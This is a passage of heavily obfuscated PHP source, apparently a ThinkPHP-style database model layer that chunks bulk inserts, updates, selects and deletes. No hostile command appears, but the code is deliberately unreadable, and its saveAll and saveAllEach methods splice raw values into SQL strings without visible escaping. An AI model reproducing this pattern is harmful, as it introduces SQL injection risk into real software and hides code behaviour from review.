(!in_array($c™ï‡ñ”¸œ[356], explode($c™ï‡ñ”¸œ[47], $dÈ„ÇÅ‘§„[2]))) { continue; } if (!isset($DßÓŠšË´ˆ[$a½†íìŒ½¸])) { continue; } switch (trim($dÈ„ÇÅ‘§„[3])) { case $c™ï‡ñ”¸œ[318]: case $c™ï‡ñ”¸œ[319]: $a±ôïÀñäî = isset($dÈ„ÇÅ‘§„[4]) ? (array) $dÈ„ÇÅ‘§„[4] : array(); array_unshift($a±ôïÀñäî, $DßÓŠšË´ˆ[$a½†íìŒ½¸]); if ($c™ï‡ñ”¸œ[318] == $dÈ„ÇÅ‘§„[3]) { $DßÓŠšË´ˆ[$a½†íìŒ½¸] = call_user_func_array($dÈ„ÇÅ‘§„[1], $a±ôïÀñäî); } else { $DßÓŠšË´ˆ[$a½†íìŒ½¸] = call_user_func_array(array(&$this, $dÈ„ÇÅ‘§„[1]), $a±ôïÀñäî); } break; case $c™ï‡ñ”¸œ[270]: $DßÓŠšË´ˆ[$a½†íìŒ½¸] = $DßÓŠšË´ˆ[$dÈ„ÇÅ‘§„[1]]; break; case $c™ï‡ñ”¸œ[291]: $a«ÀÖ£èÏ¶ = $DßÓŠšË´ˆ[$a½†íìŒ½¸]; $DßÓŠšË´ˆ[$a½†íìŒ½¸] = json_decode($a«ÀÖ£èÏ¶, !0); if (is_null($DßÓŠšË´ˆ[$a½†íìŒ½¸])) { $DßÓŠšË´ˆ[$a½†íìŒ½¸] = $a«ÀÖ£èÏ¶; } break; case $c™ï‡ñ”¸œ[320]: if ($DßÓŠšË´ˆ[$a½†íìŒ½¸] === $c™ï‡ñ”¸œ[33]) { unset($DßÓŠšË´ˆ[$a½†íìŒ½¸]); } break; case $c™ï‡ñ”¸œ[321]: $DßÓŠšË´ˆ[$a½†íìŒ½¸] = $dÈ„ÇÅ‘§„[1]; default: break; } } } public function saveAll($Aµ²ÉÈß‡Ú) { goto Bç±èÏŞò­; FÕñåéÒ˜: $Aµ²ÉÈß‡Ú = is_array($Aµ²ÉÈß‡Ú) ? $Aµ²ÉÈß‡Ú : array(); $bĞ›¡“ñÎÍ = $EöÒÓ˜Ê”›[374]; $AÂÛ“ÒîÚœ = 0; goto dë™¥ÉâÛõ; dë™¥ÉâÛõ: $eº¸Ú¤ºµ = array(); $Aù®ª¤“Îï = count($Aµ²ÉÈß‡Ú); for ($c›‹›Ìì§İ = 0; $c›‹›Ìì§İ < $Aù®ª¤“Îï; $c›‹›Ìì§İ++) { $BÂßŞšÕ¥™ = $Aµ²ÉÈß‡Ú[$c›‹›Ìì§İ]; if (!is_array($BÂßŞšÕ¥™) || count($BÂßŞšÕ¥™) != 4) { continue; } $BÂß«Èï•À = "\125\x50\x44\101\124\x45\x20\x60{$Fïô§õ‹³«}\x60\x20\123\x45\x54\40{$BÂßŞšÕ¥™[2]}\40\75\40\x43\x41\123\x45\x20{$BÂßŞšÕ¥™[0]}\40\12"; if ($AÂÛ“ÒîÚœ == 0) { $bĞ›¡“ñÎÍ = $BÂß«Èï•À; } $eº¸Ú¤ºµ[] = $EöÒÓ˜Ê”›[116] . $BÂßŞšÕ¥™[1] . $EöÒÓ˜Ê”›[116]; $AÂÛ“ÒîÚœ++; $bĞ›¡“ñÎÍ .= "\x20\127\x48\105\x4e\x20\x27{$BÂßŞšÕ¥™[1]}\47\x20\x54\110\x45\116\x20\47{$BÂßŞšÕ¥™[3]}\x27\x20\12"; if ($AÂÛ“ÒîÚœ == $EÀÛîÆÚ÷ || $c›‹›Ìì§İ == $Aù®ª¤“Îï - 1) { goto eöÓ”óº´á; eöÓ”óº´á: $b¡àƒÛëŠ = implode($EöÒÓ˜Ê”›[47], $eº¸Ú¤ºµ); $bĞ›¡“ñÎÍ .= "\40\105\116\104\40\x20\x57\110\105\x52\105\40{$BÂßŞšÕ¥™[0]}\40\111\x4e\40\x28{$b¡àƒÛëŠ}\51\x20"; $this->execute($bĞ›¡“ñÎÍ); goto A·Œ‡ÁÇ¸; A·Œ‡ÁÇ¸: $AÂÛ“ÒîÚœ = 0; $bĞ›¡“ñÎÍ = $BÂß«Èï•À; $this->chunkEventCheck(count($eº¸Ú¤ºµ)); goto B¿õ®á¼–‰; B¿õ®á¼–‰: $eº¸Ú¤ºµ = array(); goto E‘ƒ–öïÜ‹; E‘ƒ–öïÜ‹: } } goto DŞ»ŒÈì£; Bç±èÏŞò­: $EöÒÓ˜Ê”› =& $_SERVER[¬ı§†‰ú˜¼]; $Fïô§õ‹³« = $this->tablePrefix . $this->tableName; $EÀÛîÆÚ÷ = self::SQL_WHERE_IN_CHUNK; goto FÕñåéÒ˜; DŞ»ŒÈì£: $this->chunkEventSet(); goto b­ÂË¡ÀİŸ; b­ÂË¡ÀİŸ: } public function saveAllEach($cÜˆÅ…ƒ¶«) { $BòØËî¼¹ =& $_SERVER[¬ı§†‰ú˜¼]; $Cïîšìô‘ = $this->tablePrefix . $this->tableName; foreach ($cÜˆÅ…ƒ¶« as $F×½«¨’É) { if (!is_array($F×½«¨’É) || count($F×½«¨’É) != 4) { continue; } $DÏšã˜™áÃ = $F×½«¨’É[0] . $BòØËî¼¹[375] . $F×½«¨’É[1] . $BòØËî¼¹[116]; $EŸ‡ ×õš = $F×½«¨’É[2] . $BòØËî¼¹[375] . $F×½«¨’É[3] . $BòØËî¼¹[116]; $eÌÃ³ÆÍ = "\165\x70\144\141\x74\145\x20{$Cïîšìô‘}\x20\x73\145\164\x20{$EŸ‡ ×õš}\40\x77\150\145\162\x65\40{$DÏšã˜™áÃ}\x3b"; $this->execute($eÌÃ³ÆÍ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Cˆ¢øŠß¿ = false, $FÔî…´İª = false) { $this->_chunkEvent = $Cˆ¢øŠß¿; $this->_chunkEventParam = $FÔî…´İª; } private function chunkEventCheck($Aáë‰õğ÷ˆ) { if (!$this->_chunkEvent) { return; } $bäÉ¤¥êù = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $bäÉ¤¥êù[$_SERVER[¬ı§†‰ú˜¼][376]] = $Aáë‰õğ÷ˆ; Hook::trigger($this->_chunkEvent, $bäÉ¤¥êù); } public function addAll($Cæ‘½Ã°³è, $DŸ†Ä•«â› = array(), $AïÄí’Ü˜ = false) { goto B¿ëØÔ®³; Dóˆ´‡ŞŠ¡: if (empty($Cæ‘½Ã°³è)) { $this->error = think_lang($C®êƒ×óŞª[268]); return !1; } $DŸ†Ä•«â› = $this->_parseOptions($DŸ†Ä•«â›); foreach ($Cæ‘½Ã°³è as $B¯Ãà³øÜÃ => $c˜ÉœØŠ) { $Cæ‘½Ã°³è[$B¯Ãà³øÜÃ] = $this->_facade($c˜ÉœØŠ); $this->_beforeInsert($Cæ‘½Ã°³è[$B¯Ãà³øÜÃ], $DŸ†Ä•«â›); } goto bñ£‹ñğ¯; B¿ëØÔ®³: $C®êƒ×óŞª =& $_SERVER[¬ı§†‰ú˜¼]; ignore_timeout(); $C³§‰±„’ƒ = self::SQL_WHERE_IN_CHUNK; goto Dóˆ´‡ŞŠ¡; bñ£‹ñğ¯: if (method_exists($this->db, $C®êƒ×óŞª[269])) { for ($C¿‡ì’Ï½› = 0; $C¿‡ì’Ï½› < count($Cæ‘½Ã°³è); $C¿‡ì’Ï½› += $C³§‰±„’ƒ) { $Bà×¯“„Ì® = array_slice($Cæ‘½Ã°³è, $C¿‡ì’Ï½›, $C³§‰±„’ƒ); if (!is_array($Bà×¯“„Ì®) || count($Bà×¯“„Ì®) == 0) { break; } $fƒÜÁìÈ÷ = $this->db->insertAll($Bà×¯“„Ì®, $DŸ†Ä•«â›, $AïÄí’Ü˜); $this->chunkEventCheck(count($Bà×¯“„Ì®)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Cæ‘½Ã°³è as $B¯Ãà³øÜÃ => $c˜ÉœØŠ) { $fƒÜÁìÈ÷ = $this->db->insert($c˜ÉœØŠ, $DŸ†Ä•«â›, $AïÄí’Ü˜); } $this->commit(); } if (!1 !== $fƒÜÁìÈ÷) { $eí¦ÕÕ Ï = $this->getLastInsID(); if ($eí¦ÕÕ Ï) { return $eí¦ÕÕ Ï; } } return $fƒÜÁìÈ÷; goto Aê¾ËÓğÚİ; Aê¾ËÓğÚİ: } public function save($fãô÷ˆ´ÙÓ = '', $F†ŒóÈÄ³ = array()) { goto f‰ÏØáˆ®; f±Ü¸–§ï†: for ($Dõµ®”ÇŒ× = 0; $Dõµ®”ÇŒ× < $Aã–…ŠçìÎ; $Dõµ®”ÇŒ× += $AÃÑ»ó®„Ô) { $Bìà¼¬ĞœË = array_slice($F§ëâ«ÈÖ‘, $Dõµ®”ÇŒ×, $AÃÑ»ó®„Ô); if (!is_array($Bìà¼¬ĞœË) || count($Bìà¼¬ĞœË) == 0) { break; } $bÍìù‡ÌÙŠ[$Bêš³ƒŞ¡[272]][$d…¯‡¬äâƒ][1] = $Bìà¼¬ĞœË; $this->optionsValue($bÍìù‡ÌÙŠ); $fÆµ‚Ñ‰¼ += parent::save($fãô÷ˆ´ÙÓ, $F†ŒóÈÄ³); $this->chunkEventCheck(count($Bìà¼¬ĞœË)); } $this->chunkEventSet(); return $fÆµ‚Ñ‰¼; goto BøÃšáÈ—; EÓŒäÜóÇ÷: $F§ëâ«ÈÖ‘ = $bÍìù‡ÌÙŠ[$Bêš³ƒŞ¡[272]][$d…¯‡¬äâƒ][1]; $F§ëâ«ÈÖ‘ = is_array($F§ëâ«ÈÖ‘) ? $F§ëâ«ÈÖ‘ : array(); $Aã–…ŠçìÎ = count($F§ëâ«ÈÖ‘); goto f±Ü¸–§ï†; aèã‡¢˜Ø: $d…¯‡¬äâƒ = $this->findWhereField($bÍìù‡ÌÙŠ); if (!$d…¯‡¬äâƒ) { return parent::save($fãô÷ˆ´ÙÓ, $F†ŒóÈÄ³); } $fÆµ‚Ñ‰¼ = 0; goto EÓŒäÜóÇ÷; f‰ÏØáˆ®: $Bêš³ƒŞ¡ =& $_SERVER[¬ı§†‰ú˜¼]; $AÃÑ»ó®„Ô = self::SQL_WHERE_IN_CHUNK; $bÍìù‡ÌÙŠ = $this->optionsValue(); goto aèã‡¢˜Ø; BøÃšáÈ—: } public function add($DñÒ¼¸èƒ = '', $a ¹í¼Á¼Õ = array(), $f·æçÁ×é = false) { if ($this->addTaskStatus && is_array($DñÒ¼¸èƒ)) { $this->addTaskData[] = $DñÒ¼¸èƒ; return; } return parent::add($DñÒ¼¸èƒ, $a ¹í¼Á¼Õ, $f·æçÁ×é); } public function parseWhereLike($F¿‚³™ñÛ¾, $FÕ«öŠİïÔ = '', $dŠŸğ÷æ¯ = false, &$b¶È½ÖÃ³ = false) { goto c“ËĞ·‚ë„; c—µ”Úˆò: foreach ($F¿‚³™ñÛ¾ as $bŠÄÇ˜“í¯ => $fÌİƒ¸œ‡í) { if (is_array($fÌİƒ¸œ‡í) && count($fÌİƒ¸œ‡í) == 2 && $fÌİƒ¸œ‡í[0] == $eŒ†‘ÍÎÙ¹[379] && is_string($fÌİƒ¸œ‡í[1]) && substr($fÌİƒ¸œ‡í[1], 0, 1) == $eŒ†‘ÍÎÙ¹[380] && substr($fÌİƒ¸œ‡í[1], strlen($fÌİƒ¸œ‡í[1]) - 1, 1) == $eŒ†‘ÍÎÙ¹[380]) { goto dİ¥Í¬¸á“; díëò‹”ùº: continue; goto D¡‘‡Ó‡ˆ; EÄç«Ô•¶ˆ: if ($féÁ¹ŸÅ½[$eŒ†‘ÍÎÙ¹[382]]) { $BË‡óĞ¢¥ = $eŒ†‘ÍÎÙ¹[383] . $aÈˆáçµÊŞ . $eŒ†‘ÍÎÙ¹[384]; if ($féÁ¹ŸÅ½[$eŒ†‘ÍÎÙ¹[385]]) { $BË‡óĞ¢¥ = $eŒ†‘ÍÎÙ¹[384] . $aÈˆáçµÊŞ . $eŒ†‘ÍÎÙ¹[383]; } } $e‰­ƒ•ïŒÛ[$EÛ”¢õˆÈÛ] = $eŒ†‘ÍÎÙ¹[386] . $b¹¹•ã°Ò . $eŒ†‘ÍÎÙ¹[387] . $BË‡óĞ¢¥ . $eŒ†‘ÍÎÙ¹[388]; $EÛ”¢õˆÈÛ++; goto díëò‹”ùº; dİ¥Í¬¸á“: $b¶È½ÖÃ³ = !0; $b¹¹•ã°Ò = is_string($bŠÄÇ˜“í¯) ? $bŠÄÇ˜“í¯ : $FÕ«öŠİïÔ; $aÈˆáçµÊŞ = substr($fÌİƒ¸œ‡í[1], 1, strlen($fÌİƒ¸œ‡í[1]) - 2); goto B¾¸î°’æê; B¾¸î°’æê: $aÈˆáçµÊŞ = $this->db->escapeString($aÈˆáçµÊŞ); if (!strpos($b¹¹•ã°Ò, $eŒ†‘ÍÎÙ¹[95])) { $b¹¹•ã°Ò = $eŒ†‘ÍÎÙ¹[381] . $b¹¹•ã°Ò . $eŒ†‘ÍÎÙ¹[381]; } $BË‡óĞ¢¥ = $eŒ†‘ÍÎÙ¹[182] . $aÈˆáçµÊŞ . $eŒ†‘ÍÎÙ¹[182]; goto EÄç«Ô•¶ˆ; D¡‘‡Ó‡ˆ: } if (is_array($fÌİƒ¸œ‡í)) { $FÕ«öŠİïÔ = is_string($bŠÄÇ˜“í¯) ? $bŠÄÇ˜“í¯ : $FÕ«öŠİïÔ; $fÌİƒ¸œ‡í = $this->parseWhereLike($fÌİƒ¸œ‡í, $FÕ«öŠİïÔ, !0, $b¶È½ÖÃ³); } if (is_numeric($bŠÄÇ˜“í¯)) { $e‰­ƒ•ïŒÛ[$EÛ”¢õˆÈÛ] = $fÌİƒ¸œ‡í; $EÛ”¢õˆÈÛ++; } else { $e‰­ƒ•ïŒÛ[$bŠÄÇ˜“í¯] = $fÌİƒ¸œ‡í; } } if ($b¶È½ÖÃ³ && !$dŠŸğ÷æ¯) { } return $e‰­ƒ•ïŒÛ; goto fÓ÷ìÓ†ï; a×Ú¯³ôäÏ: if (!is_array($F¿‚³™ñÛ¾)) { return $F¿‚³™ñÛ¾; } $e‰­ƒ•ïŒÛ = array(); $EÛ”¢õˆÈÛ = 0; goto c—µ”Úˆò; c“ËĞ·‚ë„: $eŒ†‘ÍÎÙ¹ =& $_SERVER[¬ı§†‰ú˜¼]; $féÁ¹ŸÅ½ = $GLOBALS[$eŒ†‘ÍÎÙ¹[6]][$eŒ†‘ÍÎÙ¹[377]]; if (!$féÁ¹ŸÅ½[$eŒ†‘ÍÎÙ¹[378]]) { return $F¿‚³™ñÛ¾; } goto a×Ú¯³ôäÏ; fÓ÷ìÓ†ï: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($FÙèÕÔ±İ¼ = array()) { goto f—ÜØ ’; föã‰è—Ü’: $EÁÉ›¾Ù« = $this->findWhereField($Cƒ©´ø„„Š); if (!$EÁÉ›¾Ù« || isset($Cƒ©´ø„„Š[$B‡á¹‹©†«[289]]) || isset($Cƒ©´ø„„Š[$B‡á¹‹©†«[350]])) { return parent::select($FÙèÕÔ±İ¼); } $BîéšèŒÑ… = $Cƒ©´ø„„Š[$B‡á¹‹©†«[272]][$EÁÉ›¾Ù«][1]; goto Dáæ¸¤Í‰; DØŒ‘í—´Í: return $Bğ†Ï³Àî; goto FŠ£ŒÕÎÚÌ; Dáæ¸¤Í‰: $BîéšèŒÑ… = is_array($BîéšèŒÑ…) ? $BîéšèŒÑ… : array(); $Bğ†Ï³Àî = null; for ($aö™ÄÂ ±ö = 0; $aö™ÄÂ ±ö < count($BîéšèŒÑ…); $aö™ÄÂ ±ö += $bÙ¸ò¼İì¨) { $D¨ÔË—²± = array_slice($BîéšèŒÑ…, $aö™ÄÂ ±ö, $bÙ¸ò¼İì¨); if (!is_array($D¨ÔË—²±) || count($D¨ÔË—²±) == 0) { break; } $Cƒ©´ø„„Š[$B‡á¹‹©†«[272]][$EÁÉ›¾Ù«][1] = $D¨ÔË—²±; $this->optionsValue($Cƒ©´ø„„Š); $a±“’¤Êì = parent::select($FÙèÕÔ±İ¼); if (!$a±“’¤Êì) { continue; } $Bğ†Ï³Àî = is_array($Bğ†Ï³Àî) ? $Bğ†Ï³Àî : array(); $Bğ†Ï³Àî = array_merge($Bğ†Ï³Àî, $a±“’¤Êì); } goto DØŒ‘í—´Í; f—ÜØ ’: $B‡á¹‹©†« =& $_SERVER[¬ı§†‰ú˜¼]; $bÙ¸ò¼İì¨ = self::SQL_WHERE_IN_CHUNK; $Cƒ©´ø„„Š = $this->optionsValue(); goto föã‰è—Ü’; FŠ£ŒÕÎÚÌ: } public function delete($DÁ–†“Æ¨‹ = array()) { goto f¯æ‰«Ûˆ½; BÕãÅŠÃ¹Ş: return $A»âŞÅ³¾á; goto fä¼›™ß¬; dÌÙå£Ğ©‘: $E£ÂË³‚À– = $Bò¦ ÈŸª¿[$D­øìõ¥[272]][$eÙˆŞÂ’ˆ‚][1]; $E£ÂË³‚À– = is_array($E£ÂË³‚À–) ? $E£ÂË³‚À– : array(); for ($BêŠÙ¸÷šø = 0; $BêŠÙ¸÷šø < count($E£ÂË³‚À–); $BêŠÙ¸÷šø += $b¿”œšÁ»à) { $dåøõå©ğ = array_slice($E£ÂË³‚À–, $BêŠÙ¸÷šø, $b¿”œšÁ»à); if (!is_array($dåøõå©ğ) || count($dåøõå©ğ) == 0) { break; } $Bò¦ ÈŸª¿[$D­øìõ¥[272]][$eÙˆŞÂ’ˆ‚][1] = $dåøõå©ğ; $this->optionsValue($Bò¦ ÈŸª¿); $A»âŞÅ³¾á += parent::delete($DÁ–†“Æ¨‹); } goto BÕãÅŠÃ¹Ş; f¯æ‰«Ûˆ½: $D­øìõ¥ =& $_SERVER[¬ı§†‰ú˜¼]; $b¿”œšÁ»à = self::SQL_WHERE_IN_CHUNK; $Bò¦ ÈŸª¿ = $this->optionsValue(); goto E©Ò‹Ùöç×; E©Ò‹Ùöç×: $eÙˆŞÂ’ˆ‚ = $this->findWhereField($Bò¦ ÈŸª¿); if (!$eÙˆŞÂ’ˆ‚) { return parent::delete($DÁ–†“Æ¨‹); } $A»âŞÅ³¾á = 0; goto dÌÙå£Ğ©‘; fä¼›™ß¬: } private function findWhereField($e§óƒÉÓŒ) { $cí„²”Ï«¤ =& $_SERVER[¬ı§†‰ú˜¼]; $c©õÑİÔ‹ = self::SQL_WHERE_IN_CHUNK; if (!is_array($e§óƒÉÓŒ) || !is_array($e§óƒÉÓŒ[$cí„²”Ï«¤[272]])) { return !1; } foreach ($e§óƒÉÓŒ[$cí„²”Ï«¤[272]] as $dÈ±‘’…Ü¿ => $Aİ¡Üù…‹ë) { if (is_array($Aİ¡Üù…‹ë) && isset($Aİ¡Üù…‹ë[0]) && is_string($Aİ¡Üù…‹ë[0]) && strtolower($Aİ¡Üù…‹ë[0]) == $cí„²”Ï«¤[7] && is_array($Aİ¡Üù…‹ë[1]) && count($Aİ¡Üù…‹ë[1]) > $c©õÑİÔ‹) { ignore_timeout(); return $dÈ±‘’…Ü¿; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\164\145\155\117\x70\164\x69\157\x6e"; public $field = array(); public function listData($A¨÷âÆº = false, $B¦¸ê³„öÓ = "\155\x6f\x64\151\x66\171\124\x69\155\145", $bêğİè©Œ = false) { $E¿”‘¶Ùì¾ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$E¿”‘¶Ùì¾) { return $A¨÷âÆº ? null : array(); } if (!$A¨÷âÆº) { $E¿”‘¶Ùì¾ = array_filter(array_values($E¿”‘¶Ùì¾)); return array_sort_by($E¿”‘¶Ùì¾, $B¦¸ê³„öÓ, $bêğİè©Œ); } return $E¿”‘¶Ùì¾[$_SERVER[¬ı§†‰ú˜¼][389] . $A¨÷âÆº]; } public function insert($Aø†î‡ñò) { goto d»…­‡©çÎ; d»…­‡©çÎ: $BºÚ«¿ÇŸ¹ =& $_SERVER[¬ı§†‰ú˜¼]; $Aø†î‡ñò = array_field_key($Aø†î‡ñò, $this->field); $BºğÒ²ôÅô = Model($this->modelType)->get($BºÚ«¿ÇŸ¹[390], $this->optionType . $BºÚ«¿ÇŸ¹[391]); goto fóÜêŠŠÕÏ; Dõ¤Îõ‘À–: $Aø†î‡ñò[$BºÚ«¿ÇŸ¹[84]] = time(); Model($this->modelType)->set($BºÚ«¿ÇŸ¹[390], $BºğÒ²ôÅô, $this->optionType . $BºÚ«¿ÇŸ¹[391]); Model($this->modelType)->set($BºÚ«¿ÇŸ¹[389] . $BºğÒ²ôÅô, $Aø†î‡ñò, $this->optionType); goto a…ïîùåƒÒ; a…ïîùåƒÒ: return $BºğÒ²ôÅô; goto Bİµ†£î“; fóÜêŠŠÕÏ: $BºğÒ²ôÅô = $BºğÒ²ôÅô ? $BºğÒ²ôÅô : 0; $Aø†î‡ñò[$BºÚ«¿ÇŸ¹[392]] = ++$BºğÒ²ôÅô; $Aø†î‡ñò[$BºÚ«¿ÇŸ¹[193]] = time(); goto Dõ¤Îõ‘À–; Bİµ†£î“: } public function update($b¹æÀ¬÷˜º, $CäôÕ¤Ô½Í) { goto c³øÀĞó»Ó; C”ĞÏÖ¥¶ˆ: return Model($this->modelType)->set($F¶¸°Æ×‚‡[389] . $b¹æÀ¬÷˜º, $CäôÕ¤Ô½Í, $this->optionType); goto Aƒ“‰ºÛ‚‹; c³øÀĞó»Ó: $F¶¸°Æ×‚‡ =& $_SERVER[¬ı§†‰ú˜¼]; $CäôÕ¤Ô½Í = array_field_key($CäôÕ¤Ô½Í, $this->field); $dÂĞÈÎµø = $this->listData($b¹æÀ¬÷˜º); goto c¼‘ŠãŞç; c¼‘ŠãŞç: if (!$dÂĞÈÎµø) { return !1; } $CäôÕ¤Ô½Í = array_merge($dÂĞÈÎµø, $CäôÕ¤Ô½Í); $CäôÕ¤Ô½Í[$F¶¸°Æ×‚‡[84]] = time(); goto C”ĞÏÖ¥¶ˆ; Aƒ“‰ºÛ‚‹: } public function remove($aîëìğ‚) { return Model($this->modelType)->remove($_SERVER[¬ı§†‰ú˜¼][389] . $aîëìğ‚, $this->optionType); } public function clear() { $bôºÆó¤« =& $_SERVER[¬ı§†‰ú˜¼]; Model($this->modelType)->remove($bôºÆó¤«[390], $this->optionType . $bôºÆó¤«[391]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($dĞÉæ‘îáÄ, $f¼á’¡Ã) { if (!$f¼á’¡Ã) { return !1; } $aÀ÷Ÿ”ª›‡ = $this->listData(); $aÀ÷Ÿ”ª›‡ = array_to_keyvalue($aÀ÷Ÿ”ª›‡, $dĞÉæ‘îáÄ); return isset($aÀ÷Ÿ”ª›‡[$f¼á’¡Ã]) ? $aÀ÷Ÿ”ª›‡[$f¼á’¡Ã] : !1; } public function findByName($a˜­ÏÂ‹â¯) { return $this->findByKey($_SERVER[¬ı§†‰ú˜¼][28], $a˜­ÏÂ‹â¯); } protected function resetData($AŠÒµóë) { $AÅÜëÀ–Ó =& $_SERVER[¬ı§†‰ú˜¼]; $AŠÒµóë = is_array($AŠÒµóë) ? $AŠÒµóë : array(); $d¶¨“ñ®¸¬ = array(); for ($f•Ğƒğ½Îâ = 0; $f•Ğƒğ½Îâ < count($AŠÒµóë); $f•Ğƒğ½Îâ++) { $d¶¨“ñ®¸¬[$AÅÜëÀ–Ó[389] . $AŠÒµóë[$f•Ğƒğ½Îâ][$AÅÜëÀ–Ó[392]]] = $AŠÒµóë[$f•Ğƒğ½Îâ]; } return Model($this->modelType)->set($d¶¨“ñ®¸¬, !1, $this->optionType); } private function getAutoName($B®Ë¹¹ÅêÊ) { $EÛ“¡µÎ = array_to_keyvalue($this->listData(), $_SERVER[¬ı§†‰ú˜¼][28]); if (!$EÛ“¡µÎ || !isset($EÛ“¡µÎ[$B®Ë¹¹ÅêÊ])) { return $B®Ë¹¹ÅêÊ; } for ($c…Šã™ÓŒ = 1; $c…Šã™ÓŒ < count($EÛ“¡µÎ); $c…Šã™ÓŒ++) { $D¹öğ±ìŞá = $B®Ë¹¹ÅêÊ . "\x28{$c…Šã™ÓŒ}\51"; if (!isset($EÛ“¡µÎ[$D¹öğ±ìŞá])) { return $D¹öğ±ìŞá; } } return $D¹öğ±ìŞá; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($AÕ²¦Ã´¦ = false, $B¯´µñä¬ = '', $B•¬¤ª®Üœ = false) { goto d·Ğ‘•öØ®; A÷Œ¼ä›: $aÊÁì‰¶øØ = $this->where($FÅ‚°„ßÑ­)->select(); $aÊÁì‰¶øØ = array_to_keyvalue($aÊÁì‰¶øØ, $a¤¯ˆÒ…Ïº[93], $a¤¯ˆÒ…Ïº[371]); foreach ($aÊÁì‰¶øØ as $BÚõ›‰„‹ˆ => $bªš°›°İÒ) { if ($B•¬¤ª®Üœ || in_array($BÚõ›‰„‹ˆ, $this->jsonField)) { $aÊÁì‰¶øØ[$BÚõ›‰„‹ˆ] = json_decode($bªš°›°İÒ, !0); } } goto D…¬ÁÅœ½À; fÈ†é¬¸ÍÓ: $CĞ»¡ÚÌ = is_array($CĞ»¡ÚÌ) ? $CĞ»¡ÚÌ : array(); if (is_array($aÊÁì‰¶øØ)) { $aÊÁì‰¶øØ = array_merge($CĞ»¡ÚÌ, $aÊÁì‰¶øØ); return $AÕ²¦Ã´¦ ? isset($aÊÁì‰¶øØ[$AÕ²¦Ã´¦]) ? $aÊÁì‰¶øØ[$AÕ²¦Ã´¦] : null : $aÊÁì‰¶øØ; } $FÅ‚°„ßÑ­ = $this->filterWhere(array($a¤¯ˆÒ…Ïº[29] => $B¯´µñä¬)); goto A÷Œ¼ä›; d·Ğ‘•öØ®: $a¤¯ˆÒ…Ïº =& $_SERVER[¬ı§†‰ú˜¼]; $aÊÁì‰¶øØ = $this->cacheGet($B¯´µñä¬); $CĞ»¡ÚÌ = $this->optionDefault($B¯´µñä¬); goto fÈ†é¬¸ÍÓ; D…¬ÁÅœ½À: $this->cacheSet($B¯´µñä¬, $aÊÁì‰¶øØ); $aÊÁì‰¶øØ = array_merge($CĞ»¡ÚÌ, $aÊÁì‰¶øØ); return $AÕ²¦Ã´¦ ? $aÊÁì‰¶øØ[$AÕ²¦Ã´¦] : $aÊÁì‰¶øØ; goto bğ†ÀğŠ¤”; bğ†ÀğŠ¤”: } public function set($EùÄ‘îÃ±, $c‹ê©˜Ş˜ = false, $CÑÒ¦‚å = '') { goto B…Ç§Ú ÒÊ; B…Ç§Ú ÒÊ: $f—ÁÖƒº¼ =& $_SERVER[¬ı§†‰ú˜¼]; $this->cacheRemove($CÑÒ¦‚å); $Aõ „ÒÃâ = array(); goto cê ÇÜ¿ò; cê ÇÜ¿ò: $CßšÀä†¾Ë = is_array($EùÄ‘îÃ±) ? $EùÄ‘îÃ± : array($EùÄ‘îÃ± => $c‹ê©˜Ş˜); foreach ($CßšÀä†¾Ë as $fÈš¾µÔíğ => $dšæ¤”È†Ø) { if (is_array($dšæ¤”È†Ø)) { $dšæ¤”È†Ø = json_encode_force($dšæ¤”È†Ø); } $this->checkLength($dšæ¤”È†Ø, !1, $this->tableName . $f—ÁÖƒº¼[4] . $EùÄ‘îÃ±); $dšæ¤”È†Ø = self::textEncode($dšæ¤”È†Ø); $CßšÀä†¾Ë = array($f—ÁÖƒº¼[29] => $CÑÒ¦‚å, $f—ÁÖƒº¼[93] => $fÈš¾µÔíğ, $f—ÁÖƒº¼[371] => $dšæ¤”È†Ø); $Aõ „ÒÃâ[] = $this->filterWhere($CßšÀä†¾Ë); } if (!$Aõ „ÒÃâ) { return !0; } goto FÈÖ½Ì„«ù; FÈÖ½Ì„«ù: return $this->addAll($Aõ „ÒÃâ, array(), !0); goto d„Ã††•¼; d„Ã††•¼: } protected function optionDefault($E§õé“ù‡ = '') { return !1; } public function setDeep($aèõ™Ôæ—, $C›½Ò­å¹– = false, $f…­áÕ„‚À = '') { $dó®¦º¯£ = explode($_SERVER[¬ı§†‰ú˜¼][95], $aèõ™Ôæ—); $cğ³ÜÜ¢å = $this->get(); array_set_value($cğ³ÜÜ¢å, $aèõ™Ôæ—, $C›½Ò­å¹–); $this->set($dó®¦º¯£[0], $cğ³ÜÜ¢å[$dó®¦º¯£[0]], $f…­áÕ„‚À); } public function remove($a¤ËÂĞÚ†, $A¯ø¨®õ â = '') { $aê»İÆÖ™ =& $_SERVER[¬ı§†‰ú˜¼]; $this->cacheRemove($A¯ø¨®õ â); $e³¸½‹÷ŒŒ = $this->filterWhere(array($aê»İÆÖ™[93] => $a¤ËÂĞÚ†, $aê»İÆÖ™[29] => $A¯ø¨®õ â)); if (is_null($a¤ËÂĞÚ†)) { unset($e³¸½‹÷ŒŒ[$aê»İÆÖ™[93]]); } return $this->where($e³¸½‹÷ŒŒ)->delete(); } public function cacheSet($aÄ„åŸÊ¨, $C „…í¦ğ† = false) { return Cache::set($this->cacheKey($aÄ„åŸÊ¨), $C „…í¦ğ†); } public function cacheGet($CÂÃ¢²ÂŒŒ) { return Cache::get($this->cacheKey($CÂÃ¢²ÂŒŒ)); } public function cacheRemove($e‘Õ÷¢ÕÍÑ) { return Cache::remove($this->cacheKey($e‘Õ÷¢ÕÍÑ)); } protected function filterWhere($dÊ‡‹ßˆ‡) { return $dÊ‡‹ßˆ‡; } protected function cacheKey($Aæ‚ã•—ˆ“) { return $Aæ‚ã•—ˆ“; } } goto Cà‚¥˜‰‚¿; Cà‚¥˜‰‚¿: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\x72\143\145"; protected 